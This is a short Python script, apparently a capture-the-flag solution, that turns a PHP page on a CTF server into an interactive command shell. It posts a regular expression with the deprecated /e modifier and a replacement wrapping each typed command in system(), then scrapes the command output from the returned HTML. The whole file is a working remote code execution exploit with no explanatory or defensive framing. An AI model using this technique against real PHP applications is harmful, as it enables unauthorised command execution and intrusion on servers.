import requests
from bs4 import BeautifulSoup

url = "http://tasks.ctfd.kncyber.pl:7015/index.php"

while True:
    x = "system('" + str(input("$ ")) + "');"
    myobj = {"text" : "abc", "regexp" : "/a/e", "rep": x}
    out = requests.post(url, myobj)
    soup = BeautifulSoup(out.text, 'html.parser')
    print(soup.find_all("textarea")[1].get_text().replace('\n','')[12:-10])

